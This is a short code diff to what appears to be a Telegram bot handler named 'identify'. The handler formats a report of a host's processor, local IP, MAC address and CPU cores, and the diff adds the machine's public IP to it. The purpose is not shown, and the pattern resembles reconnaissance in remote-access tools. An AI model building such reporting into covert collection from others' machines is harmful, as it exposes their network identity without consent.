@@ -40,6 +40,7 @@ async def identify(update, context):
         f"  └ Processor: <code>{I['Processor']}</code>\n\n"
         f"🌐 <b>Network</b>\n"
         f"  ├ Local IP: <code>{I['LocalIP']}</code>\n"
+        f"  ├ Public IP: <code>{I['PublicIP']}</code>\n"
         f"  └ MAC: <code>{I['MACAddress']}</code>\n\n"
         f"⚙️ <b>Hardware</b>\n"
         f"  ├ CPU Cores: <code>{I['CPUCores']}</code>\n"
